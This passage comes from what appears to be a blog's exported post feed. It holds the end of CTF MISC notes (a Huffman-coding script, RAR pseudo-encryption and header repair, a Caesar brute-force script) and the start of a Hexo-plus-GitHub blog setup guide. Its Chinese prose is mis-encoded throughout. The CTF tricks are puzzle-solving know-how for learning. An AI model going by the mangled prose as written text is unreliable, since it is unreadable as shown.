010001000101000110011100011001001011000111011100101101000110001110011011101010101001010011101110100100111101011101010011010101010111101110101101000001111100111111010011010111101000101011111101011100101101101001100011001111101111100100111101101101110111111010111010100100101110111000011100001001000011100010101110100111110011001100101111110110100111101000010001000011011110000011010110111010110001110011111110000011110010001011010010111111101010101110010000001010011111011100101000101101010101101101000101000110011101101010110001100101011101110111100000001010000011110011010011000011111110100111011100100111000001101001110111100000101010110000010000100001110111000011111110010010100111111101010110000000000111011010000101100100111001110000001011101100000110110101011001011000111001111110010101111001011011101000010001100011101110010100111000011111001110001100111110110111101010101011001000101011010001100000010001111110011001101111111010110010001111001100111110001110011100010011011100100010011011000110000100101111100111110111101010010001101010011100110001011001111000100011011110100011101011101010111111110000011110110111011110000010111100110011100011010111101111110100000010001111100101100011110001101011111101111111011111011101010001101001000111000101111110101000110011000111011111101111110100001111011110010100011101110111111010101100111000101100100010011101001011110011111001111101110001110111111011100111100010110010011011010100011100101010101010110000001010111001101111100111110010100111000010101111001110011011011111001101110011111001000000000111101011000111110001101010011011000010100100100111011111110010000000101001111111110101100001010000001110100101001111001011011001001001011100101111110<br>surprise message len: 1000<br></code></pre></td></tr></table></figure><p>å‚è€ƒ<a href="https://blog.csdn.net/gschen_cn/article/details/105898143">Python|Huffmanç¼–ç çš„pythonä»£ç å®ç°</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#èŠ‚ç‚¹ç±»</span><br>class Node(object):<br>    def __init__(self,name=None,value=None):<br>        self._name=name<br>        self._value=value<br>        self._left=None<br>        self._right=None<br><span class="hljs-comment">#å“ˆå¤«æ›¼æ ‘ç±»</span><br>class HuffmanTree(object):<br><span class="hljs-comment">#æ ¹æ®Huffmanæ ‘çš„æ€æƒ³ï¼šä»¥å¶å­èŠ‚ç‚¹ä¸ºåŸºç¡€ï¼Œåå‘å»ºç«‹Huffmanæ ‘</span><br>    def __init__(self,char_weights):<br>        self.a=[Node(part[0],part[1]) <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> char_weights] <span class="hljs-comment">#æ ¹æ®è¾“å…¥çš„å­—ç¬¦åŠå…¶é¢‘æ•°ç”Ÿæˆå¶å­èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">while</span> len(self.a)!=1:<br>                self.a.sort(key=lambda node:node._value,reverse=True)<br>                c=Node(value=(self.a[-1]._value+self.a[-2]._value))<br>                c._left=self.a.pop(-1)<br>                c._right=self.a.pop(-1)<br>                self.a.append(c)<br>        self.root=self.a[0]<br>        self.b=list(range(10))<br>    <span class="hljs-comment">#ç”¨é€’å½’çš„æ€æƒ³ç”Ÿæˆç¼–ç </span><br>    def pre(self,tree,length):<br>        node=tree<br>        <span class="hljs-keyword">if</span> (not node):<br>                <span class="hljs-built_in">return</span><br>        <span class="hljs-keyword">elif</span> node._name:<br>                x=str(node._name) + <span class="hljs-string">&#x27;çš„ç¼–ç ä¸º:&#x27;</span><br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(length):<br>                        x+=str(self.b[i])<br>                <span class="hljs-built_in">print</span>(x)<br>                <span class="hljs-built_in">return</span><br>        self.b[length]=0<br>        self.pre(node._left,length+1)<br>        self.b[length]=1<br>        self.pre(node._right,length+1)<br>    <span class="hljs-comment">#ç”Ÿæˆå“ˆå¤«æ›¼ç¼–ç </span><br>    def get_code(self):<br>        self.pre(self.root,0)<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment">#è¾“å…¥çš„æ˜¯å­—ç¬¦åŠå…¶é¢‘æ•°</span><br>        char_weights=[(<span class="hljs-string">&#x27;j&#x27;</span>,29),(<span class="hljs-string">&#x27;z&#x27;</span>,31),(<span class="hljs-string">&#x27;7&#x27;</span>,25),(<span class="hljs-string">&#x27;e&#x27;</span>,31),(<span class="hljs-string">&#x27;l&#x27;</span>,23),(<span class="hljs-string">&#x27;6&#x27;</span>,37),(<span class="hljs-string">&#x27;4&#x27;</span>,32),(<span class="hljs-string">&#x27;p&#x27;</span>,38),(<span class="hljs-string">&#x27;h&#x27;</span>,27),(<span class="hljs-string">&#x27;g&#x27;</span>,26),(<span class="hljs-string">&#x27;x&#x27;</span>,28),(<span class="hljs-string">&#x27;i&#x27;</span>,25),(<span class="hljs-string">&#x27;u&#x27;</span>,27),(<span class="hljs-string">&#x27;n&#x27;</span>,25),(<span class="hljs-string">&#x27;8&#x27;</span>,36),(<span class="hljs-string">&#x27;0&#x27;</span>,24),(<span class="hljs-string">&#x27;o&#x27;</span>,23),(<span class="hljs-string">&#x27;c&#x27;</span>,28),(<span class="hljs-string">&#x27;y&#x27;</span>,24),(<span class="hljs-string">&#x27;1&#x27;</span>,29),(<span class="hljs-string">&#x27;b&#x27;</span>,26),(<span class="hljs-string">&#x27;m&#x27;</span>,27),(<span class="hljs-string">&#x27;2&#x27;</span>,28),(<span class="hljs-string">&#x27;v&#x27;</span>,25),(<span class="hljs-string">&#x27;d&#x27;</span>,33),(<span class="hljs-string">&#x27;f&#x27;</span>,28),(<span class="hljs-string">&#x27;9&#x27;</span>,33),(<span class="hljs-string">&#x27;t&#x27;</span>,21),(<span class="hljs-string">&#x27;w&#x27;</span>,22),(<span class="hljs-string">&#x27;a&#x27;</span>,31),(<span class="hljs-string">&#x27;r&#x27;</span>,24),(<span class="hljs-string">&#x27;s&#x27;</span>,16),(<span class="hljs-string">&#x27;k&#x27;</span>,32),(<span class="hljs-string">&#x27;5&#x27;</span>,25),(<span class="hljs-string">&#x27;q&#x27;</span>,23),(<span class="hljs-string">&#x27;3&#x27;</span>,32),(<span class="hljs-string">&#x27;&#123;&#x27;</span>,1),(<span class="hljs-string">&#x27;-&#x27;</span>,4),(<span class="hljs-string">&#x27;&#125;&#x27;</span>,1)]<br>        tree=HuffmanTree(char_weights)<br>        tree.get_code()<br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">0çš„ç¼–ç ä¸º:00000<br>5çš„ç¼–ç ä¸º:00001<br>içš„ç¼–ç ä¸º:00010<br>7çš„ç¼–ç ä¸º:00011<br>vçš„ç¼–ç ä¸º:00100<br>nçš„ç¼–ç ä¸º:00101<br>bçš„ç¼–ç ä¸º:00110<br>gçš„ç¼–ç ä¸º:00111<br>mçš„ç¼–ç ä¸º:01000<br>uçš„ç¼–ç ä¸º:01001<br>hçš„ç¼–ç ä¸º:01010<br>fçš„ç¼–ç ä¸º:01011<br>2çš„ç¼–ç ä¸º:01100<br>cçš„ç¼–ç ä¸º:01101<br>xçš„ç¼–ç ä¸º:01110<br>1çš„ç¼–ç ä¸º:01111<br>jçš„ç¼–ç ä¸º:10000<br>açš„ç¼–ç ä¸º:10001<br>eçš„ç¼–ç ä¸º:10010<br>zçš„ç¼–ç ä¸º:10011<br>3çš„ç¼–ç ä¸º:10100<br>kçš„ç¼–ç ä¸º:10101<br>4çš„ç¼–ç ä¸º:10110<br>9çš„ç¼–ç ä¸º:10111<br>dçš„ç¼–ç ä¸º:11000<br>8çš„ç¼–ç ä¸º:11001<br>6çš„ç¼–ç ä¸º:11010<br>pçš„ç¼–ç ä¸º:11011<br>tçš„ç¼–ç ä¸º:111000<br>&#125;çš„ç¼–ç ä¸º:111001000<br>&#123;çš„ç¼–ç ä¸º:111001001<br>-çš„ç¼–ç ä¸º:11100101<br>sçš„ç¼–ç ä¸º:1110011<br>wçš„ç¼–ç ä¸º:111010<br>qçš„ç¼–ç ä¸º:111011<br>oçš„ç¼–ç ä¸º:111100<br>lçš„ç¼–ç ä¸º:111101<br>rçš„ç¼–ç ä¸º:111110<br>yçš„ç¼–ç ä¸º:111111<br></code></pre></td></tr></table></figure><h2 id="27-RAR"><a href="#27-RAR" class="headerlink" title="27. RAR"></a>27. RAR</h2><h3 id="RARæ–‡ä»¶æ ¼å¼"><a href="#RARæ–‡ä»¶æ ¼å¼" class="headerlink" title="RARæ–‡ä»¶æ ¼å¼"></a>RARæ–‡ä»¶æ ¼å¼</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.freebuf.com/column/199854.html">https://www.freebuf.com/column/199854.html</a></p><p>RARæ˜¯æœ‰å››ä¸ªæ–‡ä»¶å—ç»„æˆçš„ï¼Œåˆ†åˆ«æ˜¯åˆ†åˆ«æ˜¯æ ‡è®°å—ã€å½’æ¡£å¤´éƒ¨å—ã€æ–‡ä»¶å—ã€ç»“æŸå—ï¼Œè¿™äº›å—ä¹‹é—´æ²¡æœ‰å›ºå®šåœ°å…ˆåé¡ºåºï¼Œä½†è¦æ±‚ç¬¬ä¸€ä¸ªå—å¿…é¡»æ˜¯æ ‡å¿—å—å¹¶ä¸”å…¶åç´§è·Ÿä¸€ä¸ªå½’æ¡£å¤´éƒ¨å—ã€‚æ¯ä¸ªå—éƒ½åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210405172920858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å½’æ¡£å¤´éƒ¨å—å’Œæ–‡ä»¶å—çš„å†…å®¹è¾ƒå¤šï¼Œæ–—å“¥ä»…åˆ—å‡ºæ¯ä¸ªå—å¤´éƒ¨å†…å®¹ï¼š<br><img src="https://img-blog.csdnimg.cn/20210405172938417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>RARçš„æ ‡è®°å—å’Œç»“æŸå—éƒ½æ˜¯å›ºå®šçš„7å­—èŠ‚åºåˆ—ï¼Œåˆ†åˆ«ä¸º0x52 61 72 21 1A 07 00å’Œ0xC4 3D 7B 00 40 07 00ã€‚æ–‡ä»¶å—è¿™è¾¹è¦æ³¨æ„ä¸€ä¸‹HEAD_FLAGSè¿™ä¸ªå¤´éƒ¨ï¼Œå…¶ä¸­HEAD_FLAGSçš„ä½ä¸‰ä½ä»£è¡¨åŠ å¯†æ ‡å¿—ï¼Œæ­¤ä½è‹¥è¢«ç½®ä¸º1ï¼Œåˆ™æ–‡ä»¶ä½¿ç”¨äº†åŸºäºå¯†é’¥çš„åŠ å¯†ã€‚</p><h3 id="RARä¼ªåŠ å¯†"><a href="#RARä¼ªåŠ å¯†" class="headerlink" title="RARä¼ªåŠ å¯†"></a>RARä¼ªåŠ å¯†</h3><p>å‚è€ƒ<a href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1nearå¸ˆå‚…çš„åšå®¢</a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°RARç¬¬24å­—èŠ‚è¿™ä¸ªåœ°æ–¹ï¼Œå¯¹åº”ç€ä¸€ä¸ªPASSWORD_ENCRYPTEDï¼Œæ‰€ä»¥å¦‚æœæŸRARæ–‡ä»¶æ²¡æœ‰è¢«åŠ å¯†ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œä¸­çš„æ•°å­—ä¸º0ï¼Œå°†å…¶ä¿®æ”¹ä¸º1<br><img src="https://img-blog.csdnimg.cn/20210405173804707.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†å…¶ä»1æ”¹ä¸º0å°±å¯ä»¥æ­£å¸¸æ‰“å¼€æ–‡ä»¶äº†ã€‚</p><p>ä¹Ÿå¯ä»¥ç›´æ¥winhexæˆ–è€…010editoræ‰“å¼€ï¼ŒæŠŠç¬¬24å­—èŠ‚çš„åé¢ä¸€ä¸ª4æ”¹æˆ0ä¹Ÿå¯ä»¥ã€‚ï¼ˆå³ä»24å˜æˆ20ï¼‰</p><h3 id="RARæ–‡ä»¶å—æŸ"><a href="#RARæ–‡ä»¶å—æŸ" class="headerlink" title="RARæ–‡ä»¶å—æŸ"></a>RARæ–‡ä»¶å—æŸ</h3><p>åˆ†æRARæ–‡ä»¶ç»“æ„ï¼Œæ–‡ä»¶å—çš„HEAD_TYPEåº”è¯¥æ˜¯0x74è€Œä¸æ˜¯0x7Aï¼Œä¿®æ”¹ä¸º74åä¿å­˜ã€‚<br><img src="https://img-blog.csdnimg.cn/20210405174214487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>28. å‡¯æ’’å¯†ç çˆ†ç ´è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php">s = <span class="hljs-string">&quot;Hello_Atkx&quot;</span><br><br>def kaisa(k):<br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c in s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += chr(ord(<span class="hljs-string">&#x27;a&#x27;</span>) + ((ord(c) - ord(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-keyword">int</span>(k)) % <span class="hljs-number">26</span>)<br>        elif <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += chr(ord(<span class="hljs-string">&#x27;A&#x27;</span>) + ((ord(c) - ord(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-keyword">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    <span class="hljs-keyword">print</span>(t)<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">Hello_Atkx<br>Ifmmp_Buly<br>Jgnnq_Cvmz<br>Khoor_Dwna<br>Lipps_Exob<br>Mjqqt_Fypc<br>Nkrru_Gzqd<br>Olssv_Hare<br>Pmttw_Ibsf<br>Qnuux_Jctg<br>Rovvy_Kduh<br>Spwwz_Levi<br>Tqxxa_Mfwj<br>Uryyb_Ngxk<br>Vszzc_Ohyl<br>Wtaad_Pizm<br>Xubbe_Qjan<br>Yvccf_Rkbo<br>Zwddg_Slcp<br>Axeeh_Tmdq<br>Byffi_Uner<br>Czggj_Vofs<br>Dahhk_Wpgt<br>Ebiil_Xqhu<br>Fcjjm_Yriv<br>Gdkkn_Zsjw<br></code></pre></td></tr></table></figure><h2 id="29-USBæµé‡åˆ†æ"><a href="#29-USBæµé‡åˆ†æ" class="headerlink" title="29. USBæµé‡åˆ†æ"></a>29. USBæµé‡åˆ†æ</h2><p>è¯¦è§ä¹‹å‰å†™è¿‡çš„<a href="https://blog.csdn.net/qq_46150940/article/details/115431953">USBæµé‡åˆ†æ</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>MISC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ªäººåšå®¢æ­å»ºå†ç¨‹</title>
    <link href="/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/"/>
    <url>/2020/02/04/%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E5%8E%86%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šä½¿ç”¨Hexo+githubæ­å»ºåšå®¢</p> <a id="more"></a><h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1ã€hexoï¼šæä¾›åšå®¢æ¡†æ¶ï¼Œé«˜æ•ˆã€‚<br>2ã€Node.js: ç¯å¢ƒæ‰€éœ€ï¼›Chromeä¸Šçš„JavaScriptè¿è¡Œå¼•æ“ï¼Œæˆ‘ä»¬ä¼šç”¨åˆ° bode.jsä¸‹çš„åŒ…ç®¡ç†å™¨npmã€‚<br>3ã€Git: ç¯å¢ƒæ‰€éœ€ï¼›å…è´¹ã€å¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚<br>4ã€GitHub: æä¾›å…è´¹æœåŠ¡å™¨ï¼Œè¿˜æœ‰ä»£ç æ‰˜ç®¡ç­‰åŠŸèƒ½ã€‚<br></code></pre></td></tr></table></figure><h2 id="Githubçš„åˆ›å»ºå’Œé…ç½®"><a href="#Githubçš„åˆ›å»ºå’Œé…ç½®" class="headerlink" title="Githubçš„åˆ›å»ºå’Œé…ç½®"></a>Githubçš„åˆ›å»ºå’Œé…ç½®</h2><p>å®˜ç½‘ï¼š<a href="https://github.com/">https://github.com/</a></p><p><strong>1.æ³¨å†Œè´¦å·</strong><br><img src="https://img-blog.csdnimg.cn/20210131213504600.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>2.æ–°å»ºä»“åº“</strong><br>æ–°å»ºä¸€ä¸ªå‚¨å­˜ä»“åº“ï¼Œusernameä¸ºgithubç”¨æˆ·å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">username.github.io<br></code></pre></td></tr></table></figure><p>åœ¨ä¸»é¡µå³ä¸Šè§’ï¼Œç‚¹å‡»åŠ å·ï¼Œæ‰¾åˆ°<code>New repository</code>ï¼Œç‚¹è¿›å»ä¼šæ˜¾ç¤ºå¦‚ä¸‹ç•Œé¢ï¼Œè¾“å…¥ä»“åº“åï¼Œç‚¹å‡»åˆ›å»º</p><p>Repository nameæ ¼å¼æ¨èå†™æˆ<code>username.github.io</code>,ç‚¹å‡»Create repository<br><img src="https://img-blog.csdnimg.cn/20210131214016120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>ä¸€è·¯nextï¼Œæ‰“å¼€cmdå‘½ä»¤è¡Œï¼ŒæˆåŠŸé¡µé¢å¦‚ä¸‹<br><img src="https://img-blog.csdnimg.cn/20210131140623911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰“å¼€Git-Bashå·¥å…· ï¼Œåˆå§‹åŒ–Git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.é…ç½®ç”¨æˆ·å<br>git config --global user.name <span class="hljs-string">&quot;ç”¨æˆ·å&quot;</span><br><span class="hljs-comment">#ç”¨æˆ·åå¯ä»¥ä¸æ˜¯Githubç”¨æˆ·åï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œè®¾ç½®ä¸€è‡´ã€‚</span><br>2.é…ç½®é‚®ç®±<br>git config --global user.email <span class="hljs-string">&quot;é‚®ç®±åœ°å€&quot;</span><br>3.æŸ¥çœ‹å·²é…ç½®çš„ç”¨æˆ·ä¿¡æ¯<br>git config --global list<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…Node-js"><a href="#å®‰è£…Node-js" class="headerlink" title="å®‰è£…Node.js"></a>å®‰è£…Node.js</h2><p>ä¸‹è½½åœ°å€ï¼š<a href="https://nodejs.org/en/">https://nodejs.org/en/</a><br><img src="https://img-blog.csdnimg.cn/20210131140950940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ‰“å¼€cmdï¼Œè¿›å…¥æ–‡ä»¶ç›®å½•ï¼Œå®‰è£…æˆåŠŸå¦‚ä¸‹<br><img src="https://img-blog.csdnimg.cn/20210131141134259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸ºäº†åŠ å¿«é€Ÿåº¦ï¼Œnpmæ¢æº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Program Files\nodejs&gt;npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br><br>C:\Program Files\nodejs&gt;npm config get registry<br>https://registry.npm.taobao.org/<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…Hexo"><a href="#å®‰è£…Hexo" class="headerlink" title="å®‰è£…Hexo"></a>å®‰è£…Hexo</h2><p>æœ¬åœ°å®‰è£…hexoå‰ï¼Œåº”è¯¥å…ˆåˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶å¤¹blog</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> f:/hexo<br><br>$ npm install hexo-cli -g<br><br>$ hexo init blog<br><br>$ <span class="hljs-built_in">cd</span> blog<br><br>$ npm install<br><br>$ hexo g <span class="hljs-comment"># æˆ–è€…hexo generate</span><br><br>$ hexo s <span class="hljs-comment"># æˆ–è€…hexo serverï¼Œå¯ä»¥åœ¨http://localhost:4000/ æŸ¥çœ‹</span><br></code></pre></td></tr></table></figure><p>hexoå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate (hexo g) ç”Ÿæˆé™æ€æ–‡ä»¶ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªæ–°çš„å«åšpublicçš„æ–‡ä»¶å¤¹<br><br>hexo server (hexo s) å¯åŠ¨æœ¬åœ°webæœåŠ¡ï¼Œç”¨äºåšå®¢çš„é¢„è§ˆ<br><br>hexo deploy (hexo d) éƒ¨ç½²æ’­å®¢åˆ°è¿œç«¯ï¼ˆæ¯”å¦‚github, herokuç­‰å¹³å°ï¼‰<br><br><span class="hljs-variable">$hexo</span> new <span class="hljs-string">&quot;postName&quot;</span> <span class="hljs-comment">#æ–°å»ºæ–‡ç« </span><br>$ hexo new page <span class="hljs-string">&quot;pageName&quot;</span> <span class="hljs-comment">#æ–°å»ºé¡µé¢</span><br>$ hexo d -g <span class="hljs-comment">#ç”Ÿæˆéƒ¨ç½²</span><br>$ hexo s -g <span class="hljs-comment">#ç”Ÿæˆé¢„è§ˆ</span><br></code></pre></td></tr></table></figure><p>æœ¬åœ°hexoé…ç½®æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Users\admin&gt;hexo -v<br>hexo-cli: 4.2.0<br>os: Windows_NT 10.0.19041 win32 x64<br>node: 14.15.4<br>v8: 8.4.371.19-node.17<br>uv: 1.40.0<br>zlib: 1.2.11<br>brotli: 1.0.9<br>ares: 1.16.1<br>modules: 83<br>nghttp2: 1.41.0<br>napi: 7<br>llhttp: 2.1.3<br>openssl: 1.1.1i<br>cldr: 37.0<br>icu: 67.1<br>tz: 2020a<br>unicode: 13.0<br></code></pre></td></tr></table></figure><h1 id="Hexoä¸»é¢˜è®¾ç½®"><a href="#Hexoä¸»é¢˜è®¾ç½®" class="headerlink" title="Hexoä¸»é¢˜è®¾ç½®"></a>Hexoä¸»é¢˜è®¾ç½®</h1><p>å®˜æ–¹ä¸»é¢˜æ¨èï¼š<a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><h2 id="ä¸»é¢˜1ï¼šstun"><a href="#ä¸»é¢˜1ï¼šstun" class="headerlink" title="ä¸»é¢˜1ï¼šstun"></a>ä¸»é¢˜1ï¼šstun</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" 